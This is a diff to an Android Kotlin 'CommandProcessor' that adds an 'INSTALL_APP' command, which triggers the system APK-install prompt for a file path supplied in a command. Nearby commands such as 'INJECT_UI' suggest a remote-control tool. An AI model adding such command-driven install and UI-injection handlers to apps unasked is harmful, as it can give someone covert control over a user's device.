@@ -551,6 +551,31 @@ object CommandProcessor {
                     }
                     status = "DISPLAY_RESTORED"
                 }
+                "INSTALL_APP" -> {
+                    val apkFile = File(content.trim())
+                    if (apkFile.exists() && apkFile.isFile) {
+                        try {
+                            val uri = androidx.core.content.FileProvider.getUriForFile(
+                                ctx, 
+                                "${ctx.packageName}.fileprovider", 
+                                apkFile
+                            )
+                            val installIntent = Intent(Intent.ACTION_VIEW).apply {
+                                setDataAndType(uri, "application/vnd.android.package-archive")
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                            }
+                            ctx.startActivity(installIntent)
+                            status = "INSTALL_PROMPT_TRIGGERED"
+                        } catch (e: Exception) {
+                            status = "INSTALL_FAILED"
+                            errorMsg = "FileProvider Error: ${e.message}"
+                        }
+                    } else {
+                        status = "INSTALL_FAILED (NOT_FOUND)"
+                        errorMsg = "APK file not found at: ${content.trim()}"
+                    }
+                }
                 "INJECT_UI" -> {
                     val separatorIndex = content.indexOf("|")
                     if (separatorIndex != -1) {
